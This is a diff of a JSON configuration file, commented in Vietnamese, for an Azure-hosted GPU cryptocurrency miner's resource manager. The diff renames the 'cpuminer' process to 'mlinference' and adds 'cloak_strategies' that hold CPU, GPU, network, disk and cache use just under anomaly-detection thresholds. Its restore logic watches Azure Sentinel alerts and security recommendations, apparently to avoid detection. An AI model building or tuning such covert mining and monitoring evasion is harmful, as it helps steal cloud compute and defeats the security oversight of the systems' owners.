@@ -1,170 +1,155 @@
 {
-  "_comment": "Cấu hình tài nguyên dành cho ResourceManager, đảm bảo tối ưu hóa cho CPU, RAM, GPU, I/O, và băng thông mạng trên cơ sở hạ tầng mô tả.",
-  "processes": {
-      "_comment": "Định nghĩa tên tiến trình khai thác CPU và GPU để ResourceManager nhận diện.",
-      "CPU": "mlinference",
-      "GPU": "gpuminer"
-  },
-  "process_priority_map": {
-      "_comment": "Xác định mức ưu tiên cho tiến trình. Giá trị càng cao, ưu tiên càng lớn.",
-      "cpuminer": 2,
-      "gpuminer": 3
-  },
-  "network_interface": "eth0",
-  "optimization_parameters": {
-      "_comment": "Các thông số tinh chỉnh thuật toán tối ưu tài nguyên.",
-      "gpu_power_adjustment_step": 10,
-      "_comment_gpu_power": "Mỗi lần điều chỉnh GPU sẽ thay đổi 10% mức sử dụng GPU.",
-      "disk_io_limit_step_mbps": 10,
-      "_comment_disk_io_step": "Mỗi lần điều chỉnh Disk I/O sẽ thay đổi 10 MBps."
-  },
-  "resource_allocation": {
-      "_comment": "Cấu hình phân bổ tài nguyên tối ưu cho sản xuất.",
-      "cpu": {
-          "_comment": "Cấu hình dành cho CPU Intel Xeon E5-2690 v4 (12 vCPUs, 2.6GHz).",
-          "max_threads": 12,
-          "_comment_max_threads": "Giới hạn tối đa số vCPU có thể phân bổ cho tiến trình.",
-          "default_freq_mhz": 2600,
-          "_comment_default_freq": "Tần số mặc định ở mức 2.6GHz.",
-          "min_freq_mhz": 1800,
-          "_comment_min_freq": "Tần số CPU tối thiểu để giảm tải nhiệt và công suất.",
-          "max_freq_mhz": 2600,
-          "_comment_max_freq": "Tần số CPU tối đa không vượt quá mặc định của CPU."
-      },
-      "ram": {
-          "_comment": "Giới hạn RAM tối đa dành cho tiến trình khai thác. Với 224 GiB ~ 229376 MB, đặt giới hạn nhằm đảm bảo dư địa cho hệ thống.",
-          "max_allocation_mb": 200000
-      },
-      "gpu": {
-          "_comment": "Giới hạn mức sử dụng GPU. Chúng ta có 2 GPU Tesla V100, mỗi cái 32GB. Cho phép tối đa 90% sử dụng.",
-          "max_usage_percent": [90, 90],
-          "_comment_usage_range": "Thêm phạm vi tối ưu để `setup_env.py` kiểm tra.",
-          "usage_percent_range": {
-              "_comment": "Phạm vi sử dụng GPU cho kiểm tra tính hợp lệ.",
-              "max": 90
-          }
-      },
-      "disk_io": {
-          "_comment": "Giới hạn I/O cho ổ đĩa. Ổ cục bộ đạt 736-2948 MiB/s, đặt max ~2500 MBps. Min là 50 MBps.",
-          "min_limit_mbps": 50,
-          "max_limit_mbps": 2500
-      },
-      "network": {
-          "_comment": "Giới hạn băng thông mạng. Hỗ trợ tối đa ~1600 Mbps, đặt max 1000 Mbps để cân bằng.",
-          "bandwidth_limit_mbps": 1000
-      },
-      "cache": {
-          "_comment": "Giới hạn bộ nhớ đệm cache chiếm dụng bởi tiến trình, tính theo phần trăm.",
-          "limit_percent": 50
-      }
-  },
-  "monitoring_parameters": {
-      "_comment": "Cấu hình tần suất giám sát nhiệt độ, công suất, và tương tác với Azure Monitor.",
-      "temperature_monitoring_interval_seconds": 15,
-      "_comment_temperature_interval": "Kiểm tra nhiệt độ CPU/GPU mỗi 15 giây.",
-      "power_monitoring_interval_seconds": 15,
-      "_comment_power_interval": "Kiểm tra công suất CPU/GPU mỗi 15 giây.",
-      "azure_monitor_interval_seconds": 300,
-      "_comment_azure_monitor_interval": "Thu thập dữ liệu từ Azure Monitor mỗi 300 giây (5 phút).",
-      "optimization_interval_seconds": 30,
-      "_comment_optimization_interval": "Chạy mô hình AI để tối ưu tài nguyên mỗi 30 giây."
-  },
-  "temperature_limits": {
-      "_comment": "Giới hạn nhiệt độ CPU/GPU.",
-      "cpu": {
-          "max_celsius": 75,
-          "_comment_cpu_temp": "Ngưỡng nhiệt độ CPU tối đa."
-      },
-      "gpu": {
-          "max_celsius": 85,
-          "_comment_gpu_temp": "Ngưỡng nhiệt độ GPU tối đa."
-      }
-  },
-  "power_limits": {
-      "_comment": "Giới hạn công suất tổng và per-device.",
-      "total_power_watts": {
-          "max": 200,
-          "_comment_total_power": "Ngưỡng công suất tổng tối đa (W)."
-      },
-      "per_device_power_watts": {
-          "cpu": {
-              "max": 150,
-              "_comment_cpu_power": "Giới hạn công suất CPU tối đa (W)."
-          },
-          "gpu": {
-              "max": 150,
-              "_comment_gpu_power": "Giới hạn công suất GPU tối đa (W)."
-          }
-      }
-  },
-  "baseline_thresholds": {
-      "_comment": "Các ngưỡng baseline để phát hiện bất thường (sử dụng trong anomaly_detector).",
-      "cpu_usage_percent": 80,
-      "_comment_cpu_usage": "Ngưỡng sử dụng CPU tổng thể (%) trên đó coi là bất thường.",
-      "gpu_usage_percent": 80,
-      "_comment_gpu_usage": "Ngưỡng sử dụng GPU (%) trên đó coi là bất thường.",
-      "ram_usage_percent": 80,
-      "_comment_ram_usage": "Ngưỡng sử dụng RAM tổng thể (%) trên đó coi là bất thường.",
-      "disk_io_usage_mbps": 80,
-      "_comment_disk_io_usage": "Ngưỡng sử dụng Disk I/O (MBps) trên đó coi là bất thường.",
-      "network_usage_mbps": 80,
-      "_comment_network_usage": "Ngưỡng sử dụng băng thông mạng (MBps) trên đó coi là bất thường."
-  },
-  "safe_restore_parameters": {
-      "_comment": "Cấu hình để hỗ trợ kiểm tra an toàn trước khi khôi phục tài nguyên.",
-      "enable_safe_restore": true,
-      "_comment_enable_safe_restore": "Bật/tắt kiểm tra an toàn trước khi khôi phục.",
-      "max_retry_attempts": 3,
-      "_comment_max_retry": "Số lần thử lại nếu điều kiện chưa an toàn để khôi phục.",
-      "retry_interval_seconds": 30,
-      "_comment_retry_interval": "Thời gian chờ (giây) giữa các lần thử khôi phục.",
-      "additional_checks": {
-          "_comment": "Định nghĩa các kiểm tra bổ sung tùy chọn trước khi khôi phục.",
-          "check_sentinel_alerts": true,
-          "check_log_analytics": true,
-          "check_security_recommendations": true,
-          "check_traffic_anomalies": true
-      }
-  },
-  "azure_integration": {
-      "_comment": "Cấu hình bổ sung cho tích hợp với Azure Sentinel, Log Analytics, Security Center, Traffic Analytics.",
-      "sentinel": {
-          "_comment": "Cấu hình tham khảo cho Azure Sentinel.",
-          "alert_check_days": 1,
-          "_comment_alert_check": "Số ngày gần nhất để kiểm tra cảnh báo từ Azure Sentinel."
-      },
-      "log_analytics": {
-          "_comment": "Cấu hình tham khảo cho Azure Log Analytics.",
-          "query_interval_minutes": 5,
-          "_comment_query_interval": "Thời gian (phút) giữa các lần truy vấn Log Analytics."
-      },
-      "security_center": {
-          "_comment": "Cấu hình tham khảo cho Azure Security Center.",
-          "recommendation_check_interval_minutes": 10,
-          "_comment_security_interval": "Thời gian (phút) giữa các lần kiểm tra khuyến nghị bảo mật."
-      },
-      "traffic_analytics": {
-          "_comment": "Cấu hình tham khảo cho Azure Traffic Analytics.",
-          "check_interval_minutes": 10,
-          "_comment_traffic_interval": "Thời gian (phút) giữa các lần kiểm tra lưu lượng bất thường."
-      }
-  },
-  "azure_anomaly_detector": {
-      "_comment": "Cấu hình bổ sung cho Azure Anomaly Detector và Azure OpenAI Client.",
-      "api_base": "https://eastus.api.cognitive.microsoft.com/",
-      "_comment_api_base": "Endpoint API của Azure Anomaly Detector.",
-      "api_key": "${ANOMALY_DETECTOR_API_KEY}",
-      "_comment_api_key": "API Key cho Azure Anomaly Detector. Thay thế bằng khóa thực tế."
-  },
-  "azure_openai": {
-      "_comment": "Cấu hình cho Azure OpenAI Client.",
-      "api_base": "https://anomalyd.openai.azure.com/",
-      "_comment_api_base": "Endpoint API của Azure OpenAI Service.",
-      "api_key": "${OPENAI_API_KEY}",
-      "_comment_api_key": "API Key cho Azure OpenAI Service. Thay thế bằng khóa thực tế.",
-      "deployment_name": "gpt4-deployment-name",
-      "_comment_deployment_name": "Tên deployment của Azure OpenAI Service.",
-      "api_version": "2023-03-15-preview",
-      "_comment_api_version": "Phiên bản API của Azure OpenAI Service."
-  }
+    "_comment": "Cấu hình tài nguyên dành cho ResourceManager, đảm bảo tối ưu hóa cho CPU, RAM, GPU, I/O, và băng thông mạng trên cơ sở hạ tầng mô tả.",
+    "processes": {
+        "CPU": "mlinference",
+        "GPU": "gpuminer"
+    },
+    "process_priority_map": {
+        "mlinference": 2,
+        "gpuminer": 3
+    },
+    "network_interface": "eth0",
+    "optimization_parameters": {
+        "gpu_power_adjustment_step": 10,
+        "disk_io_limit_step_mbps": 10
+    },
+    "resource_allocation": {
+        "cpu": {
+            "max_threads": 12,
+            "default_freq_mhz": 2600,
+            "min_freq_mhz": 1800,
+            "max_freq_mhz": 2600
+        },
+        "ram": {
+            "max_allocation_mb": 200000
+        },
+        "gpu": {
+            "max_usage_percent": [90, 90],
+            "usage_percent_range": {
+                "max": 90
+            }
+        },
+        "disk_io": {
+            "min_limit_mbps": 50,
+            "max_limit_mbps": 2500
+        },
+        "network": {
+            "bandwidth_limit_mbps": 1000
+        },
+        "cache": {
+            "limit_percent": 50
+        }
+    },
+    "monitoring_parameters": {
+        "temperature_monitoring_interval_seconds": 15,
+        "power_monitoring_interval_seconds": 15,
+        "azure_monitor_interval_seconds": 300,
+        "optimization_interval_seconds": 30
+    },
+    "temperature_limits": {
+        "cpu_max_celsius": 80,
+        "gpu_max_celsius": 85
+    },
+    "power_limits": {
+        "total_power_watts": {
+            "max": 300
+        },
+        "per_device_power_watts": {
+            "cpu": {
+                "max": 150
+            },
+            "gpu": {
+                "max": 150
+            }
+        }
+    },
+    "baseline_thresholds": {
+        "cpu_usage_percent": 80,
+        "gpu_usage_percent": 80,
+        "ram_usage_percent": 80,
+        "disk_io_usage_mbps": 80,
+        "network_usage_mbps": 80
+    },
+    "safe_restore_parameters": {
+        "enable_safe_restore": true,
+        "max_retry_attempts": 3,
+        "retry_interval_seconds": 30,
+        "additional_checks": {
+            "check_sentinel_alerts": true,
+            "check_log_analytics": true,
+            "check_security_recommendations": true,
+            "check_traffic_anomalies": true
+        }
+    },
+    "azure_integration": {
+        "sentinel": {
+            "alert_check_days": 1
+        },
+        "log_analytics": {
+            "query_interval_minutes": 5
+        },
+        "security_center": {
+            "recommendation_check_interval_minutes": 10
+        },
+        "traffic_analytics": {
+            "check_interval_minutes": 10
+        }
+    },
+    "azure_anomaly_detector": {
+        "api_base": "https://eastus.api.cognitive.microsoft.com/",
+        "api_key": "${ANOMALY_DETECTOR_API_KEY}"
+    },
+    "azure_openai": {
+        "api_base": "https://anomalyd.openai.azure.com/",
+        "api_key": "${OPENAI_API_KEY}",
+        "deployment_name": "gpt4-deployment-name",
+        "api_version": "2023-03-15-preview"
+    },
+    "cloak_strategies": {
+        "cpu": {
+            "strategy_name": "cpu_cloaking",
+            "parameters": {
+                "max_usage_percent": 80
+            }
+        },
+        "gpu": {
+            "strategy_name": "gpu_cloaking",
+            "parameters": {
+                "max_usage_percent": 80
+            }
+        },
+        "network": {
+            "strategy_name": "network_cloaking",
+            "parameters": {
+                "bandwidth_limit_mbps": 800
+            }
+        },
+        "disk_io": {
+            "strategy_name": "disk_io_cloaking",
+            "parameters": {
+                "disk_io_limit_mbps": 400
+            }
+        },
+        "cache": {
+            "strategy_name": "cache_cloaking",
+            "parameters": {
+                "cache_limit_percent": 75
+            }
+        }
+    },
+    "ai_driven_monitoring": {
+        "enabled": false
+    },
+    "log_analytics": {
+        "enabled": false,
+        "log_level": "INFO",
+        "log_destination": "/app/mining_environment/logs/resource_manager.log"
+    },
+    "alert_thresholds": {
+        "cpu_usage_percent": 90,
+        "gpu_usage_percent": 90,
+        "ram_usage_percent": 90,
+        "disk_io_usage_mbps": 90,
+        "network_usage_mbps": 90
+    }
 }
